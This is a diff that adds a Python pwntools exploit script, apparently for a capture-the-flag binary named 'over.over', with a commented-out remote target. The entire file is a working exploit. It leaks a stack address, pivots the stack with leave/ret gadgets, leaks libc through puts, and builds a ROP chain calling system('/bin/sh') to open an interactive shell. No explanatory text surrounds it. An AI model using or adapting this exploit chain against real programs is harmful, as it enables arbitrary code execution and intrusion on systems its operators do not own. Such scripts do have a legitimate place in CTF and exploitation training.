@@ -1,0 +1,39 @@
+from pwn import *
+context.log_level="debug"
+context.binary = "./over.over"
+p=process("./over.over")
+#p=remote("10.21.13.69",10005)
+elf=ELF("./over.over")
+libc = elf.libc
+puts_got=0x601020
+puts_plt=0x000000000400530
+offset=88
+pop_rbp_ret=0x4005e0
+leaveq_ret=0x4006be
+pop_rdi_ret=0x400793
+
+#payload=p64(0xdeadbeef).ljust(80,'\xff')
+#p.sendafter('>',payload)
+
+p.sendafter(">", 'a' * 80)
+stack=u64(p.recvuntil("\x7f")[-6:].ljust(8,'\0'))-0x70
+print "stack",hex(stack)
+
+
+
+payload=("deadbeef"+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(0x400676)).ljust(80,'\xff')+p64(stack)+p64(leaveq_ret)
+p.sendafter(">",payload)
+
+libc.address = u64(p.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.symbols['puts']
+
+print "puts:",hex(libc.symbols['system'])
+print "base:",hex(libc.address)
+
+pop_rdx_pop_rsi_ret=libc.address+0xf5279
+gdb.attach(p)
+payload=("DEADBEEF"+p64(pop_rdi_ret)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])).ljust(80,'\xff')+p64(stack-0x30)+p64(leaveq_ret)
+p.sendafter(">",payload)
+
+
+
+p.interactive()
